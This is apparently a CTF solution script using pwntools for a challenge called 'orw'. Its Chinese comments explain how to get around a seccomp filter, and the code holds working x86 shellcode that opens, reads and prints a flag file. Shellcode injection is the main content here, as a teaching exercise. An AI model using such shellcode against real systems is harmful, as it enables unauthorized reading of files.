# -*- coding:utf8 -*-

'''
checksec一波，只开了canary保护
接着扔到ida，发现是让你输入shellcode然后程序就去执行你的shellcode，
但正如这道题的名字orw，获取flag的方法是用open,read,write三个syscall来完成的，
但不能用拿shell的方式，因为orw_seccomp()中的代码是这样的：

因为通过查资料发现这个prctl函数有点迷，限制了我们syscall的调用，
具体的为什么限制，怎么样限制我也看得不是很懂，
反正就是不能用system（/bin/sh）或者execve（/bin/sh）了

那就需要我们自己写shellcode执行cat flag，

内容为：
fp = open("flag",0)
read(fp,buf,0x30)
write(1,buf,0x30)

那我们需要查到，O'R'W'三个函数对应的系统调用号和参数应该调入的寄存器


'''
from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']
bin = ELF('orw.bin')
cn = process('./orw.bin')

cn.recv()

shellcode='''
push 1;
dec byte ptr [esp];
push 0x67616c66;
mov ebx,esp;
xor ecx,ecx;
xor edx,edx;
xor eax,eax;
mov al,0x5;
int 0x80;

mov ebx,eax;
xor eax,eax;
mov al,0x3;
mov ecx,esp;
mov dl,0x30;
int 0x80;

mov al,0x4;
mov bl,1;
mov dl,0x30;
int 0x80;
'''
'''
fp = open("flag",0)
read(fp,buf,0x30)
write(1,buf,0x30)
'''

#gdb.attach(cn)
#raw_input()
cn.sendline(asm(shellcode))
cn.interactive()
